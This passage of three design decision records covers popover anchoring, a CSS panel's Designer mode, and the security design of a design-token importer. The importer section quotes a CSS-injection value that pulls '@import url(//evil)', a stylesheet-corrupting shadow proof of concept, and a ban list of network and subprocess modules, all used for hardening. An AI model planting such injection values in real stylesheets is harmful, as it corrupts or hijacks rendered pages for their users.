decision.title: `TokenPopover` anchoring — re-anchor on scroll/resize + a measure-and-cancel rect-diff pass, not transformed-ancestor hunting
decision.rationale:
# DDR-170: `TokenPopover` anchoring — re-anchor on scroll/resize + a measure-and-cancel rect-diff pass, not transformed-ancestor hunting

**Status:** Accepted — 2026-07-14
**Extends:** feature-inspector-controls-redesign (Phase 1, Task 6 — the CSS panel's variables popover mis-position fix, `apps/studio/client/app.jsx` `TokenPopover`, `place()` at ~line 4597).

## Context

`TokenPopover` renders as a `position: fixed` element portalled to `document.body`, positioned from a one-shot `getBoundingClientRect()` snapshot of its trigger button. The pre-Phase-1 bug: `position: fixed` resolves against the nearest ancestor that establishes a new containing block (a `transform`/`filter`/`will-change` on any element between `document.body` and the popover — e.g. the studio right-panel's own mount-in transform), not necessarily the viewport. A one-shot snapshot doesn't track that ancestor moving (scroll, layout change), so the popover would drift from its trigger — the prior workaround was to dismiss the popover on scroll rather than fix the anchor.

Finding the *exact* transformed ancestor and subtracting its offset would work, but requires walking the DOM chain and re-deriving it every time a new call site changes the panel's structure — fragile, and the kind of thing that silently breaks the next time a wrapper gains a `transform` for an unrelated reason (e.g. a future animation).

## Decision

Two complementary mechanisms, both already implemented at `apps/studio/client/app.jsx` inside `TokenPopover`'s effect (~lines 4592-4657), neither of which needs to know *which* ancestor is responsible:

1. **Re-anchor, don't dismiss.** `place()` (the viewport-relative position calculator from the trigger's `getBoundingClientRect()`) re-runs on `window resize` and on any `scroll` event (capture phase, so it catches scrolling in any ancestor container, not just the window) — replacing the old dismiss-on-scroll behavior. This alone fixes the common case (the popover tracks its trigger through ordinary scrolling).
2. **Measure-and-cancel rect-diff compensation.** A second effect measures where the popover **actually landed** (`popRef.current.getBoundingClientRect()`) versus where `place()` **intended** it (the `pos` state, computed in viewport coordinates), and cancels the delta (`dx = pos.left - r.left`, `dy = pos.top - r.top`) by adjusting `pos` accordingly. This is correct regardless of *why* the discrepancy exists — a transformed ancestor, a `will-change` boundary, or any future CSS change that alters the fixed containing block — because it operates on the observed rendering outcome, not on identifying the cause. It converges in at most one correction: once the delta is compensated, the measured rect matches the intended one and the effect becomes a no-op (guarded by a `0.5px` threshold to avoid infinite re-triggering on sub-pixel rounding).

**Rejected alternative:** walking the ancestor chain to find the specific transformed element and subtracting its offset directly. Rejected because it's brittle to structural changes elsewhere in the shell (any future wrapper gaining a `transform` for an unrelated reason — e.g. a panel-entry animation — would silently reintroduce the bug, requiring someone to remember to update the ancestor-walk logic). The measure-and-cancel approach is self-correcting by construction and needs no maintenance when the shell's DOM structure changes.

## Consequences

- The popover now tracks its trigger correctly at any scroll position or canvas zoom/pan level, verified live during Phase 1's a11y/design-system re-verification pass.
- This pattern (re-anchor + measure-actual-vs-intended-and-cancel) is the reusable fix for any future `position: fixed`-portalled element with the same containing-block ambiguity — reach for this before a new ancestor-offset-hunting implementation.
- Cost: one extra `getBoundingClientRect()` read per open/reposition cycle (the compensation effect) — negligible relative to the popover's own render cost, not worth optimizing away.

decision.title: CSS panel gains a second, Figma-vocabulary "Designer mode" — a conscious, scoped override of DDR-104 §2
decision.rationale:
# DDR-171: CSS panel gains a second, Figma-vocabulary "Designer mode" — a conscious, scoped override of DDR-104 §2

**Status:** Accepted — 2026-07-14
**Supersedes:** [DDR-104](./DDR-104-css-panel-ux-model.md) §2 ("Vocabulary = Hybrid… we do not rename properties to human labels") — **for the Designer-mode scope only**. DDR-104's other decisions (value source, curated tier, token-first, the two escape hatches, provenance, canvas-first critic gate) are unchanged and still govern both modes.
**Related:** [DDR-104](./DDR-104-css-panel-ux-model.md) (the panel this extends), `.ai/plans/feature-inspector-controls-designer-mode.md` (the plan implementing this decision), `.ai/plans/archive/feature-inspector-controls-redesign.md` (Phase 1 — the control-library primitives Designer mode reuses).

## Context

DDR-104 deliberately rejected human-label vocabulary translation ("Fill" instead of `background-color`, etc.) after a live user-feedback round on the original raw-CSS-only panel — the reasoning was that a code-backed tool should keep the row honest to the real property name, with friendly section headers carrying the approachability instead.

That reasoning held for a panel used by one audience: people iterating on real TSX who think in CSS. It stops holding once a second audience shows up — a non-technical user who doesn't think in `border-radius` / `box-shadow` / `flex-direction` at all and hits a wall the section headers don't solve. The user asked explicitly for a Figma-vocabulary mode (2026-07-14) after using the shipped Phase-1 control library long enough to feel this gap.

Three independent debate seats (BUILDER, SHIPPER, BREAKER — reduce-tier, no live cross-talk) were run before any code changed. All three converged unprompted on two points: (1) don't build a second, undocumented vocabulary without recording why — this DDR is that record; (2) the new mode must not be named "Advanced," because the panel already has an "Advanced" *section* (the raw-CSS/HTML-attribute escape hatch from DDR-104 §5), and reusing the word for a *mode* collides with that.

The user, after seeing the naming-collision risk surfaced, made an informed, explicit call to override it: the **raw-CSS mode itself** is named "Advanced" (not the new Figma-vocabulary mode), on the reasoning that the raw-CSS mode nesting the raw-CSS-property escape hatch is conceptually consistent — both mean "pro-level access" — rather than confusing. This DDR records that the collision was surfaced and consciously accepted, not overlooked.

## Decision

1. **Designer mode is additive, not a replacement.** `CssKnobs` gains a `mode` state (`'advanced' | 'designer'`), default `'advanced'` — zero behavior change for existing users until they opt in, persisted via `localStorage` (`maude-cp-mode`, mirroring the existing `mdcc-sections-expanded` pattern). Advanced mode is DDR-104's original decision, byte-identical, unchanged.
2. **Designer mode is a regroup, not a 1:1 relabel.** The real pain BUILDER's opening identified: task-relevant properties are scattered across today's 8 sections (e.g. Hug/Fill/Fixed sizing lives in Size while flex properties live in Layout, even though both are "Auto layout" in Figma's mental model). Designer mode's 11 clusters (Auto layout / Size / Position / Fill / Stroke / Corner radius / Effects / Opacity / Text / Spacing / Media) cut across today's section boundaries where the Figma mental model demands it — full cluster map in the plan's Design Decisions section.
3. **Zero new control primitives, zero new write endpoint.** Every Designer-mode row is built from `CssKnobs`'s existing closures (`row`, `color`, `num`, `csel`, `tok`, `vtok`, `iconseg`, `radiusControl`, `sizeModeSeg`, `commit`) or the Phase-1 shared library (`Segmented`, `AlignPad`, `SliderField`, `NumberField`). Both modes ride the same `POST /_api/edit-css` → `editAttribute` path DDR-104 established — the DDR-054 trust boundary and DDR-104's provenance/token-first/shadow-flagging guardrails are carried forward unchanged for Designer mode.
4. **`row()` gains an optional label override**, applied to both the visible label text and the `title` tooltip together (never left out of sync — the exact gap BREAKER's opening flagged). All existing Advanced-mode call sites pass nothing and render byte-identical output.
5. **Two new real CSS rows — `filter` (blur-only, v1) and `mix-blend-mode`** — fill a genuine DDR-104 OUT-list gap (§3: both were explicitly deferred to the custom-attributes hatch). They're needed for Designer mode's "Effects" cluster to be a faithful Figma-parity surface, and since `applyEdit`/`editStyleProp` is property-name-generic (no server allowlist), they're added as real curated rows in Advanced mode's Appearance section too — not Designer-mode-exclusive. `filter` is scoped to `blur(Npx)` only in v1, not a full filter-function editor.
6. **The naming collision is accepted, not resolved.** "Advanced" now names both the raw-CSS *mode* (this DDR) and the raw-CSS/attribute *section* nested inside it (DDR-104 §5) — a conscious choice on the reasoning above, revisit only if real user confusion surfaces post-ship.

## Consequences

- Non-technical users get a Figma-familiar on-ramp; technical users keep the honest-CSS-labels panel DDR-104 built, reached via the same toggle.
- Two doors, one control: the per-corner radius detach, the Hug/Fill/Fixed sizing toggle, and every other Phase-1 primitive behave identically whether reached from Advanced or Designer mode — same underlying `commit`/`optimistic`/`authored` state, just a different render tree branch inside the same `CssKnobs` function body (not a second component — avoids the props-threading drift risk BREAKER flagged with a second render surface).
- `filter`/`mix-blend-mode` are visible and editable from Advanced mode as of this DDR — DDR-104 §3's OUT-list entry for both is now superseded; the rest of that OUT-list (`display` was already promoted by DDR-104's own addendum; `position`/`transform`/etc. — see feature-element-editing-robustness Stage B) is untouched by this DDR.
- If Designer mode's cluster map turns out wrong in practice (a cluster nobody uses, a regroup that confuses more than it clarifies), it's a presentation-layer change only — no data model, write path, or provenance logic to migrate, since Designer mode owns no state Advanced mode doesn't already have.

## Addendum — 2026-07-14 (post-ship polish, user-driven)

Two same-day refinements after the owner reviewed the shipped panel:

1. **The mode is now an App-owned, Settings-surfaced preference.** The `mode` state was lifted from `CssKnobs` to `App` (the exact single-source-of-truth pattern `theme` uses) so it's controllable from BOTH the in-panel corner toggle and **Settings → Appearance → "Inspector vocabulary"**, and the two never diverge. App owns the `maude-cp-mode` localStorage persistence; the panel and the Settings radio are controlled views. The in-panel toggle itself was demoted from a full-width `Segmented` row to a compact 2-icon `IconButtonGroup` (`{}` raw-CSS / wand Figma) in the id-row corner — the full-width bar read as far too heavy for a mode switch this minor.

2. **Designer mode suppresses the inherited-provenance dot — a conscious, scoped partial-divergence from DDR-104 §6.** DDR-104 §6 made provenance legible *per row* (token-bound / raw-override / inherited) with a dot on every row. For the developer-facing Advanced surface that's the point and is **unchanged**. But on the Designer surface the dot on every row built a "punch-card" left rail that was the single biggest driver of the visual clutter the owner flagged (measured against Figma's own dot-free panel). So under the `.st-cp--designer` root modifier ONLY, the **inherited** dot is hidden (`visibility:hidden`, the grid column stays reserved so labels never shift) — the bound/override dots stay, because "this value is customized" is useful signal even to a non-technical user and is rare enough not to form a rail. Advanced mode keeps DDR-104 §6 in full. Also under the same modifier: section headers drop mono/UPPERCASE for the body font + title case ("Auto layout" not "AUTO LAYOUT"), and row labels switch from mono to the body face — all cosmetic, Designer-scoped, reversible. The rationale is DDR-171's own thesis (Designer mode serves the audience that doesn't think in CSS), applied to provenance density rather than vocabulary; recording it so the §6 divergence is a decision, not an accident.

decision.title: Token-file import — mapping contract and ingestion security posture
decision.rationale: # DDR-172: Token-file import — mapping contract and ingestion security posture **Status:** Accepted — 2026-07-14 (design-stage, pre-code per plan `.ai/plans/feature-onboarding-and-design-system-migration.md` T11: this DDR gates all of T11's code, same discipline as T9/DDR-167 gated T10. `ethical-hacker` + `security-auditor` ran two full rounds — Round 1 against the initial draft (3 blockers, 6 warnings from security-auditor; 2 HIGH, 3 MEDIUM, 1 LOW from ethical-hacker, plus convergent findings from a third, accidental duplicate pass), Round 2 confirming every fix against the revised text and surfacing a handful of LOW/LOW-MED residuals, all closed. See § Security review below.) **Extends:** [DDR-167](DDR-167-local-file-svg-pdf-ingestion-security-posture.md) (the sibling ingestion-security DDR for SVG/PDF — this DDR follows its "threat model → mitigation → named residual" structure, but covers a **structurally different** input class: structured JSON/CSS token data, not executable markup), [DDR-045](DDR-045-real-disk-path-resolution-for-compiled-dev-server.md) (real-disk-path resolution), [DDR-043](DDR-043-bias-free-design-plugin-templates.md) (no hardcoded visual defaults — the scaffold fallback path here reuses the same "neutral skeleton" posture). **Instruments (planned, Phase 3 / T11):** `apps/studio/bin/import-tokens.sh` + `apps/studio/bin/_import-tokens.mjs` (shared pure functions) + tests; a small addition to `apps/studio/draw/palette.ts` (`rgbToOklch` — colorspace normalization, no new dependency); `cli/commands/design.mjs` verb registration. **CLI-only** — unlike T10, there is no HTTP route and no in-app upload panel for this verb (the plan's "Files to Create" list for T11 names only the CLI verb + tests). No canvas-origin route classification story applies. ## Context Maude's only token-authoring path today is the interactive `/design:setup-ds` discovery flow, which writes `system//colors_and_type.css` from `core/colors_and_type.css.tpl` using values chosen through the Stage 1–4 conversation. There is no way to bring in a design system a user **already has** as a file — a `tokens.json` (W3C design-tokens draft), a Style-Dictionary JSON export, or a raw CSS custom-properties file. Plan task T11 builds `maude design import-tokens` to close this gap: parse one of those three formats, map recognized token names onto Maude's documented CSS-variable contract (`--bg-*`, `--fg-*`, `--accent*`, `--border-*`, `--status-*`, `--space-*`, `--type-*`, `--lh-*`, `--radius-*`, `--shadow-*`, `--dur-*`, `--ease-*`, `--font-*` — the family-prefix contract documented in `core/colors_and_type.css.tpl` and enforced by the design-system-completeness-critic), and **scaffold or patch** the target DS accordingly, emitting a mapping report that never silently drops an unmapped token. **Why this needs its own DDR rather than riding on DDR-167.** DDR-167 covers *byte-level* ingestion of SVG/PDF — content whose defining risk is **execution** (script, embedded actions, parser-CVE memory corruption). Token files are inert, structured data (JSON or a restricted CSS subset) with **no execution surface of their own** — the risk here is different in kind: (a) attacker-controlled *values* being written verbatim into a stylesheet that Maude's own studio-client and every canvas under the DS actually **renders live in a browser**, which is a CSS-injection question, not a script-execution one; (b) unbounded alias/reference resolution in the JSON formats (a DoS class DDR-167 doesn't have, because SVG/PDF have no analogous "resolve this name to another name in the same file" indirection); (c) the standard "parse untrusted JSON, walk keys recursively" prototype-pollution class, which is JSON-specific and absent from DDR-167's XML/binary formats. None of DDR-167's specific mechanisms (execution canary, sandboxed-render, worker-thread isolation for a parser hang) apply here in the same shape, so this DDR re-derives the threat model from scratch rather than inheriting DDR-167's mitigations by reference. ## Decision 1 — Input parsing: format-appropriate parsers, no hand-rolled CSS parser for untrusted input **No new dependency.** JSON formats use the native `JSON.parse`, never `eval`/`Function`/a YAML-superset parser. **Round-1 revision (security-auditor W5):** the initial draft proposed reusing `lightningcss` (`apps/studio/package.json`) for the raw-CSS-custom-properties input format. That dependency is a native napi addon exercised today only at **build time** (`apps/studio/build.ts:22`) — this verb is CLI-only and ships inside the `bun --compile` standalone binary end users install, and its runtime availability inside that compiled binary was never verified. This is exactly the native-addon/`bun --compile` risk class DDR-070/DDR-167 both deliberately avoid (DDR-167 rejected `pdfjs-dist` + `node-canvas` for the identical reason). Rather than take on an unverified runtime dependency, `_import-tokens.mjs` parses the raw-CSS input format with a **small, purpose-built, single-pass tokenizer** — not a regex, and not a full CSS parser (which the narrow "extract `--name: value;` declarations from a `:root`/theme-selector block" task doesn't need). The tokenizer walks the input character-by-character tracking three pieces of state — brace depth, whether it is inside a quoted string (honoring `\`-escapes), and whether it is inside a `/* … */` comment — and only emits a `{name, rawValue}` pair when it sees a `--name:` at depth 1 immediately inside a selector block, up to the next unescaped, non-string, non-comment `;` or `}`. This is provably safe against the adversarial shapes a regex extractor is vulnerable to (a `}` or `;` inside a quoted string or a comment can never be mistaken for a declaration terminator, because the tokenizer tracks those states explicitly) without depending on a parser whose runtime footprint in the shipped binary is unverified. - **W3C design-tokens** (`$value`/`$type`, optional group-level `$type` inheritance, alias syntax `{group.token.path}` inside a `$value` string) and **Style-Dictionary** (`value`/`type`, alias syntax `{group.token.path}`) are both plain JSON. - **Byte-size cap: 2 MB** on the input file, checked before parsing (mirrors DDR-167's pre-parse cap discipline). A design-token file this size is already generous — Style-Dictionary exports for large multi-brand systems commonly run tens of KB. - **Input-file read mirrors DDR-167 Decision 2 step 1** (security-auditor W6): `realpath()`-then-open with a symlink-substitution reject, then a single capped read into memory — the same buffer is reused for the size check and the parse; no second, independent read of the operator-given path. **Implementation-time refinement (discovered writing the T11 test suite): the symlink check is LEAF-ONLY** (the file itself, checked via `lstatSync` against the pre-resolution path — never every ancestor directory component). A whole-ancestor-chain walk was tried first and rejects nearly every real macOS path outright, because `/tmp` and `/var` are themselves OS-level symlinks (`-> /private/tmp`/`-> /private/var`) — that check would have made the mechanism unusable, not more secure. The threat this actually closes — the file getting swapped out from under this read between validation and open (check-then-read substitution) — is fully covered by a leaf check; an attacker able to plant a symlink in a PARENT directory the operator already trusts and navigated into has an easier path to the same data than racing this read, which is the identical residual DDR-167 Decision 2 step 1 already names and accepts explicitly. Not a new gap — a narrower, correct implementation of the same accepted boundary. - A JSON parse failure, or a tokenizer parse failure on the raw-CSS format, is a **hard reject** with a clear "could not parse as ``" error — never a silent fallback to a different format guess. **Parse-error messages report only structural position (byte offset, expected-vs-found token class) — never a verbatim excerpt of the input file content** (security-auditor completeness note — an error path that echoes attacker-controlled input back to the caller is a namable, avoidable micro-exfil/reflection channel, closed here by construction). ## Decision 2 — Alias/reference resolution: cycle-safe, depth-capped, same-file only, WHOLE-VALUE aliases only Both W3C and Style-Dictionary formats let a token's value reference another token by path (`"{color.brand.500}"`). This is genuinely useful (a `--accent-hover` alias to `--accent` should resolve), but it is also the one part of this format family with no execution-safety analogue in DDR-167 — an unbounded or cyclic resolver is a pure availability bug (stack overflow / infinite loop, or — Round-1 finding below — an amplification bomb) waiting in untrusted input. **Round-1 finding (security-auditor W1 + ethical-hacker F5, same root cause found two ways): depth+cycle bounds alone don't bound total work.** A per-*chain* visited-set with a depth cap stops infinite loops and overlong chains, but neither stops (a) a composite token with multiple alias-able sub-fields creating branching fan-out with no memoization across sibling branches, or (b) a *partial-string, multi-reference* alias form (`"value": "{a} {a}"`, a real Style-Dictionary interpolation feature) that **doubles in size per resolution level** — a billion-laughs analogue with zero cycles and no chain exceeding the depth cap. Both are closed structurally, not by a size budget, by narrowing what this importer resolves at all: - **Only WHOLE-VALUE single-alias substitution is resolved.** A token's raw value is treated as an alias reference ONLY when the entire trimmed value is exactly one `{group.token.path}` reference — nothing else on either side. A value that merely *contains* a `{…}` span alongside other text (`"{a} solid"`, `"{a} {b}"`) is **not** treated as alias syntax at all — it is passed through unresolved, as literal text, into Decision 4's grammar validation (which will reject it, since `{`/`}` appear in no grammar). This makes each token have **at most one outgoing alias edge**, which structurally caps total resolution work at O(tokens × max depth) regardless of how many tokens reference the same target — no branching-fanout term is possible, and partial-string interpolation (the doubling mechanism) is simply not a supported feature, not a bounded one. - **Resolution happens over an in-memory flattened token map built from THIS FILE ONLY.** An alias that doesn't resolve to a token present in the same file is left **unresolved** and the token is reported `unmapped: unresolved-alias` — the resolver never reads, requests, or opens any other file, URL, or path. This closes a "malicious token file references `$ref`/`extends`/an alias path that happens to look like a filesystem path, and a naive resolver tries to open it" class outright: the resolver's only data source is the parsed-in-memory object graph, and any `$ref`/`extends`-shaped key with a string value that isn't a same-file whole-value alias is treated as inert data, never dereferenced as a file or network location. - **Permanent test, not prose alone (ethical-hacker F4 — DDR-167's own lesson: "policy prose alone is exactly the failure mode this codebase has already hit once").** A standing test asserts the alias-resolver module imports none of `fs`/`net`/`http`/`https`/`dns`/`child_process` — checked **both with and without** the `node:` prefix (`fs` and `node:fs` both banned; a grep scoped to only the `node:`-prefixed form is trivially evaded) — and contains no reference to the global `fetch` or `XMLHttpRequest`. *(Round-2 tightening, ethical-hacker — the original ban list covered only the `node:`-prefixed fs/net/http(s) trio and missed the unprefixed-specifier evasion, `child_process` (exfil via spawning a subprocess), and `dns`.)* Mirrors `cli/lib/plugin-cli-reachability.test.mjs`'s existing "grep the tree for a banned call shape" pattern. This is what makes the "never dereferences a path/URL" claim above an enforced invariant instead of an intention a later refactor (e.g. someone "helpfully" adding real `$ref`-file support) could silently violate. - **Cycle detection via a per-resolution visited-set**, retained as defense-in-depth even though the whole-value-only restriction already makes a cycle the only way to loop: resolving token A pushes A onto a `Set` for that resolution chain; encountering an already-visited path is a hard reject of that single token (`rejected: circular-alias`), not a crash — the rest of the file continues processing normally. - **Max resolution depth: 16**, and a **global resolved-value memoization cache** (resolve each distinct token path at most once, reuse the result for every other token that references it) — belt-and-braces on top of the structural fix above, and it's free: with at-most-one-outgoing-edge per token, memoization turns "N tokens each independently walking up to a 16-deep chain" into "each distinct token resolved once." ## Decision 3 — Prototype-pollution-safe tree walk, structurally depth-capped Flattening the parsed JSON into `{path, value, type}` leaves requires recursing over attacker-controlled object keys. The walk explicitly **skips** any key equal to `__proto__`, `constructor`, or `prototype` at every recursion level (both when reading and when the resulting flattened map is later looked up by path) — the standard, minimal-cost mitigation for this exact "recursively walk untrusted JSON keys" shape. This is a one-line guard per recursion step, not a new dependency (`Object.create(null)` for the flattened map's storage achieves the same thing structurally and is used for the map itself). **Round-1 finding (security-auditor W4): this structural walk has no depth cap of its own, independent of Decision 2's alias-depth cap.** Decision 2 bounds how deep an *alias chain* can go; it says nothing about how deep the raw *JSON object/array nesting* can go before alias resolution ever runs. A 2 MB input consisting almost entirely of deeply nested arrays (`[[[[…]]]]`) fits easily under the byte cap while nesting millions of levels deep, stack-overflowing a naive recursive flattener before Decision 2's logic is reached at all. The flatten walk therefore carries its **own** explicit recursion-depth cap — **32** — independent of and checked before any alias-resolution logic; input nested deeper than that is a hard reject (`rejected: structure-too-deep`), not a crash. ## Decision 4 — Value-grammar allowlist: the CSS-injection closure (the load-bearing decision in this DDR) **This is the single highest-value control in this DDR.** Unlike DDR-167's SVG/PDF (write-once artifacts referenced via ``/rasterized PNG, never inlined as live markup), a `colors_and_type.css` value written by this importer is **immediately and continuously rendered** — every canvas under the target DS, and the studio-client chrome itself if this is the active DS, loads this stylesheet live in a real browser. An attacker-controlled value is therefore a direct CSS-injection vector into a surface Maude actually renders, not a dormant file on disk. Every value this importer is about to write is validated against an **explicit per-target-family grammar** before it touches the output file. A value that doesn't match its family's grammar is **rejected outright** (`rejected: invalid-value-shape`) — never written, never "cleaned up" or partially accepted: | Target family | Allowed value grammar | | --- | --- | | `--bg-*`, `--fg-*`, `--border-*`, `--accent*`, `--status-*` (colors) | `^#[0-9a-fA-F]{3}$`, `^#[0-9a-fA-F]{4}$`, `^#[0-9a-fA-F]{6}$`, or `^#[0-9a-fA-F]{8}$` (exactly the 4 valid hex lengths — see Round-1 note below) OR `^oklch\([\d.]+%? [\d.]+ [\d.]+( ?/ ?[\d.]+%?)?\)$` OR `^rgba?\( ?[\d.]+[ ,]+[\d.]+[ ,]+[\d.]+( ?[,/] ?[\d.]+%?)? ?\)$` OR `^hsla?\( ?[\d.]+ [\d.]+% [\d.]+%( ?/ ?[\d.]+%?)?\)$` — numeric-argument color functions only, nothing else, matched against a literal space character (never `\s`) wherever whitespace is structurally required (Round-2 hardening, see below). rgb/rgba's inter-argument separator is `[ ,]+` (one or more of space/comma, so the common `rgb(255, 0, 0)` comma-space form matches) — oklch/hsl intentionally support ONLY the modern single-space-separated syntax (no comma alternative), so their separators stay a plain literal space, never a repeatable class. | | `--space-*`, `--radius-*`, `--type-*`, `--lh-*` (dimensions) | `^-?[\d.]{1,6}(px\|rem\|em\|%)$` or bare `0`, AND the numeric magnitude (unit stripped) must fall in **0–512** (`--type-*`/`--lh-*`/`--radius-*`) or **0–4096** (`--space-*`, generous for a max-width-adjacent spacing token) — see Round-1 note below | | `--dur-*` (durations) | `^[\d.]{1,6}m?s$`, magnitude bounded to **0–60000** (ms-equivalent) | | `--ease-*` (easing) | `^cubic-bezier\( ?-?[\d.]+ ?, ?-?[\d.]+ ?, ?-?[\d.]+ ?, ?-?[\d.]+ ?\)$` or one of the CSS easing keywords (`linear`, `ease`, `ease-in`, `ease-out`, `ease-in-out`) | | `--font-*` (font stacks) | A comma-separated list where every entry is either a **quoted string matching `^"[A-Za-z0-9 _-]{1,64}"$`** (letters, digits, space, hyphen, underscore only — no `\`, no unescaped quote, no CSS-special characters) or one of a fixed generic-family keyword set (`serif`, `sans-serif`, `monospace`, `system-ui`, `ui-monospace`, `ui-sans-serif`, `ui-serif`, `cursive`, `fantasy`). **Deliberately rejects legitimate unquoted family names** (`Arial, Helvetica`) — a known, intentional conservative restriction, not an oversight; loosening it to admit bare identifiers is a real future request but must re-derive the charset safety argument from scratch, not be waved through as a usability fix. | | `--shadow-*` | `^( ?-?[\d.]{1,5}px ){2,4}rgba?\( ?[\d.]+[ ,]+[\d.]+[ ,]+[\d.]+( ?[,/] ?[\d.]+%?)? ?\)( ?, ?( ?-?[\d.]{1,5}px ){2,4}rgba?\( ?[\d.]+[ ,]+[\d.]+[ ,]+[\d.]+( ?[,/] ?[\d.]+%?)? ?\))*$` — one or more ` [] [] ` layers, comma-separated; **every layer, not just the first, uses the identical strict numeric-argument rgba grammar** — see Round-1 finding directly below, this is the fix for it. Each length is either a bare `0` (valid CSS shorthand — no unit required) or a strict `px` number — matches the real maude DS's own shape (`0 1px 2px rgba(...)`). | **Round-1 finding, found independently by both reviewers with a concrete PoC (security-auditor B1, ethical-hacker F1) — the original `--shadow-*` grammar was NOT airtight.** The first draft spelled out the first shadow layer numerically but let every subsequent layer use `rgba?\([^)]+\)` — `[^)]+` matches anything except a literal `)`, including `;`, `{`, `}`, `@`, `url(`, quotes, and newlines, directly contradicting this section's own closure claim. Ethical-hacker constructed a concrete value — `0px 0px rgba(0,0,0), 0px 0px rgba(0(0)` — that passes the flawed grammar (the `[^)]+` layer captures `0(0`) and writes an **unbalanced open-paren** into the stylesheet, which per CSS custom-property parsing swallows subsequent tokens — including the declaration's own terminating `;` and the enclosing block's `}` — until the next `)` or EOF, corrupting or silently dropping later declarations in a stylesheet every canvas renders live. The table above now uses the strict first-layer grammar for every layer; there is no `[^)]+`/`[^;]+` anywhere in any grammar in this DDR. **Round-1 finding (ethical-hacker F2): grammars must never be matched with the `m` (multiline) or `s` (dotall) regex flags, and every value is hard-rejected BEFORE grammar matching unless it consists ENTIRELY of printable ASCII (`0x20`–`0x7E`).** `^`/`$` anchors are only as strong as the flags they're evaluated under — under `/m`, `^#[0-9a-fA-F]{3,8}$` would match just the first line of a multi-line value, letting `#fff\n};@import url(//evil)` sail through as `#fff`. A printable-ASCII-only pre-filter (`^[\x20-\x7E]*$`, checked before any grammar regex runs) is simpler and more complete than enumerating specific forbidden characters: it closes not just C0 controls and the literal `\n`/`\r` but every JS `LineTerminator` code point (U+2028/U+2029, which `/m` treats as line boundaries despite not being C0 controls) and every other non-ASCII whitespace/control/formatting character (U+00A0, zero-width characters, bidi-override characters) in one universal rule, rather than an enumeration a future refactor could incompletely port. Every value this DDR's grammars actually need to admit — numbers, units, hex digits, named color-function syntax, a bounded charset of font-name characters — is already pure ASCII, so this costs nothing in expressiveness. *(Round-2 refinement, security-auditor N2/N3 + ethical-hacker Round-2 F2 — the original per-character enumeration was verified to miss U+2028/U+2029 specifically; the printable-ASCII-only rule supersedes the enumeration rather than patching it further.)* No part of this pipeline uses `/m` (Decision 7's redesigned patch is block-scoped, trimmed-line-start matching, not a whole-file `^…$/m` anchor — see Decision 7), so this is stated as an unconditional invariant, not contingent on avoiding some other component's flag choice; it is also an independent, redundant closure (defense-in-depth alongside the shadow-grammar fix above) for the newline-smuggling chain in Decision 7's Round-1 finding below. Decision 4's grammars use a literal space character, not `\s`, wherever whitespace is structurally required — closing the adjacent gap where a `\s`-permissive grammar could accept a "valid-shaped" value that isn't actually valid CSS and silently renders as nothing. **The same printable-ASCII-only + no-`m`/`s`-flags rule applies to the `--new-ds ` charset check in Decision 8** — stated there explicitly rather than left as an implicit "obviously the same rule applies," per ethical-hacker Round-2's finding that the two checks weren't visibly tied together in the prior revision. **Round-1 finding (security-auditor W3): the original grammars bounded value *shape* but not *magnitude*.** `[\d.]+` is unbounded, so a grammar-valid `--space-9: 99999999px` or `--type-0: 99999rem` would reach a stylesheet rendered live in every canvas and the studio-client's own WKWebView (a context this codebase's own memory already documents as having a real filter/perf ceiling) — a pathological magnitude is a live-render hang/jank vector even though it's a "valid" value shape. Every numeric grammar above now pairs its shape check with an explicit magnitude range, checked after the regex match on the parsed numeric value. Every grammar is **closed under composition with itself only** — no grammar admits `;`, `{`, `}`, `@`, `url(`, `expression(`, `javascript:`, `\`, or an unescaped quote, because none of the permitted constructs (numbers, units, named color functions with numeric arguments, a bounded charset for font names) can produce those characters, and no grammar contains an unbounded free-text capture group. This is what closes CSS injection: even a value that survives JSON/CSS parsing intact cannot smuggle a rule terminator, an `@import`, or a `url()` reference into the output file, because nothing that shape is in any grammar. `var(--other-token)` references **from the input file** are deliberately **not** in any grammar and are rejected — an imported token file may reference its OWN other tokens via the format's own alias syntax (Decision 2), resolved to a concrete value before this validation step ever runs; it may not reference an arbitrary Maude-side `--custom-property` name that could later be redefined out from under it. ## Decision 5 — Name-to-variable mapping: heuristic, never silent There is no reliable way to know that a foreign token author's `"Surface/BG/0"` means the same thing as Maude's `--bg-0` without either (a) a rigid required input schema (defeats the point of importing an *existing* system) or (b) heuristic name matching that can be wrong. This DDR chooses (b), with the failure mode made **loud, not silent**: - The importer normalizes each flattened token's path (lowercase, delimiter-collapse on `/`, `.`, `-`, `_`, camelCase-split) and matches it against a curated table of recognized naming patterns per target family (e.g. `bg|background|surface` + a ladder-position cue `0|base|default|page` → `--bg-0`; `accent|brand|primary` (when `$type`/`type` is `color`) → `--accent`; `space|spacing|gap` + a numeric scale index → the nearest `--space-N` slot; full table lives in the implementation, not duplicated here — it is data, not a security control). - **A token whose path matches no recognized pattern is `unmapped`** — never guessed, never force-mapped to "the closest thing." It is written to the mapping report (`{path, detectedType, targetVariable: null, status: "unmapped"}`) and otherwise ignored. - **A token that maps to a family, but whose value fails Decision 4's grammar, is `rejected`** — reported with the specific grammar violation, never partially applied. - **A token that maps AND validates, but whose target variable has no existing declaration in the target `colors_and_type.css`** (e.g. the target DS never adopted the `status` family) is `skipped` by default — the importer does not force-insert new declarations into a hand-authored file structure unless the caller passes `--force-insert`. - Only tokens that are `mapped` land in the output. The mapping report — printed to stdout and, matching this codebase's existing report-artifact convention, written to `/_history/_system/import-tokens-report-.json` — is a **complete accounting of every input token's disposition**, not just the successes. This is the concrete mechanism behind the plan's "unmapped tokens surfaced, never silently dropped" requirement — a report file, not a prose promise. ## Decision 6 — Colorspace normalization: convert when confident, report when not The target DS's `config.json` declares `colorSpace` (`oklch | hsl | hex | lab`, default `oklch` per the completeness-critic's V2 check). A mapped color token whose input format doesn't match: - **hex/rgb → oklch**: converted using a new `rgbToOklch()` added to `apps/studio/draw/palette.ts` (the exact inverse of the existing `oklchToRgb`, same Björn Ottosson constants, same file — no new module, no new dependency). `parseColor()` (already exported from `palette.ts`) handles the hex/rgb parse side. - **oklch input, oklch target**: passed through via the existing `parseOklch`/re-serialize, value-grammar-validated as usual. - **hsl or lab input, when the target `colorSpace` is NOT the same format**: conversion is **not attempted** — DDR-172 does not add an hsl↔oklch or lab↔oklch converter in this pass. The token is reported `skipped: unsupported-colorspace-conversion (hsl→oklch)` rather than silently passed through as a mismatched value or silently dropped. This is a real, named capability gap (matching this project's own "accepted residual, named explicitly" convention) — extending conversion coverage is a small, low-risk follow-up, not a blocker for T11. ## Decision 7 — Write-path: atomic, contained, non-destructive, 